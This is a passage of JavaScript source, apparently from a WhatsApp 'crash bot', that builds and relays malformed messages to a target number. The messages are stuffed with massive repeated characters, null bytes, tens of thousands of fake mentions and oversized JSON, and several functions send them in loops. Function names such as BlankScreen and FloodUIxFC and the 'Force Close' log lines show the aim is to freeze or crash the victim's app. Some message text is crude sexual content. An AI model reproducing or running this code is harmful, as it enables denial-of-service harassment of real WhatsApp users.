                    }, {});

                    for (let x = 0; x < 50; x++) {
                    await vinzzoffc.relayMessage(
                    target,
                    {
                    groupStatusMessageV2: {
                    message: msg.message
                    }
                    },
                    {
                    messageId: msg.key.id,
                    participant: { jid: target } 
                    }
                    )
                    };

                    await vinzzoffc.relayMessage(target, {
                    statusMentionMessage: {
                    message: {
                    protocolMessage: {
                    key: msg.key,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    type: 25
                    },
                    additionalNodes: [
                    {
                    tag: "meta",
                    attrs: { is_status_mention: "-503" },
                    content: undefined
                    }
                    ]
                    }
                    }
                    }, {});
}

async function XStromDelayBeta(vinzzoffc, targetJid) {
  for (let i = 0; i < 1000; i++) {
    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
               { length: 1000 * 40 },
                 () =>
               "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
            },
            body: {
              text: "@zyyimupp Here Bro!!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
      Math.floor(Math.random() * 16777215)
                    .toString(16)
      .padStart(6, "99999999"),
    },
  );
  
  await vinzzoffc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [x],
    additionalNodes: [
      {
        tag: "meta",
            attrs: {},
            content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  await new Promise((resolve) => setTimeout(resolve, 250));
 }
}

async function BlankScreen(vinzzoffc, target) {
  try {
    const ThumbRavage = "https://files.catbox.moe/cfkh9x.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: ThumbRavage, gifPlayback: true }
    }, {
      upload: vinzzoffc.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
          title: "M͉̅ͮ͒ͤA̷͙ͭͫ̕R͉̜̎͡͠C̵͉͋̔͞V̘̪͆̂̅A̷͙ͭͫ̕L̸̖̽̌͂K͕͓͌̎̾Ỵ̛̖͋͢R͉̜̎͡͠I̍̅̀̎̊O̖̼ͩ͌͐N̺̻̔̆ͅ",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: ""
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    msg.key.remoteJid = target;
    msg.key.fromMe = false;
    msg.key.id = generateMessageID(); 
    await vinzzoffc.relayMessage(target, msg.message, { messageId: msg.key.id});
    console.log(`TravasBlank Delay Send To ${target}`);
  } catch (err) {
    console.error("Error in BlankScreen:", err);
  }
}
    function generateMessageID() {
  return Math.random().toString(36).slice(2) + Date.now();
}
async function NewBlanks(vinzzoffc, target) {
  try {
    const ThumbRavage = "https://files.catbox.moe/cfkh9x.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: ThumbRavage, gifPlayback: true }
    }, {
      upload: vinzzoffc.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
          title: " M͉̅ͮ͒ͤA̷͙ͭͫ̕R͉̜̎͡͠C̵͉͋̔͞V̘̪͆̂̅A̷͙ͭͫ̕L̸̖̽̌͂K͕͓͌̎̾Ỵ̛̖͋͢R͉̜̎͡͠I̍̅̀̎̊O̖̼ͩ͌͐N̺̻̔̆ͅ",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: ""
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    await vinzzoffc.relayMessage(target, msg.message, { messageId: msg.key.id});
    console.log(`TravasBlank Delay Send To ${target}`);
  } catch (err) {
    console.error("Error in BlankScreen:", err);
  }
}

async function XProtexBlankChatV5(vinzzoffc, target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "⌁⃰𝐓𝐇𝐄 𝐖𝐀𝐑𝐑𝐈𝐎𝐑𝐒🥵👈ཀ‌‌" + "ោ៝".repeat(10000),
      caption: "ោ៝".repeat(10000),
      contextInfo: {
      expiration: 1,
        ephemeralSettingTimestamp: 1,
        entryPointConversionSource: "WhatsApp.com",
        entryPointConversionApp: "WhatsApp",
        entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: "0@s.whatsapp.net",
          questionMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        },
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: true
        }
      },
      body: {
        text: "⎋ 🦠</🧬⃟༑⌁⃰𝐓𝐇𝐄 𝐖𝐀𝐑𝐑𝐈𝐎𝐑𝐒🥵👈" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
      },
      nativeFlowMessage: {
        messageParamJson: "{".repeat(25000),
      },
        buttons: [
          {
            name: "cta_url",
            buttonParamJson: "\u0000".repeat(25000),
          },
        ],
      },
    };
  
  await vinzzoffc.relayMessage(target, MSG, {
    participant: { jid: target },
    messageId: null,
  });
}

async function FloodUIxFC(vinzzoffc, target) {
  const floodXMention = [
    "0@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 50; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "mau di entot zephyrine ga?😖",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: floodXMention,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "mau di entot zephyrine ga?😖" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await vinzzoffc.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
      console.error("Flood UI Force Close Error:", err);
    }
  }
}

// Add proper exit handling
process.on('SIGINT', () => {
  console.log('Received SIGINT, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down gracefully...');
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  process.exit(0);
});
